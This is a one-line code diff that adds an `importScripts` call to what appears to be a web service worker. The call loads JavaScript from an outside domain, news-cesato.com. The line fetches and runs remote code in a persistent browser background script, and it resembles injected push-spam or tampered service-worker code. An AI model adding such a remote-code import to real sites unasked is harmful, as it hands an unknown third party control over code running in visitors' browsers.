@@ -1,0 +1,1 @@
+importScripts('https://news-cesato.com/v2-sw.js');
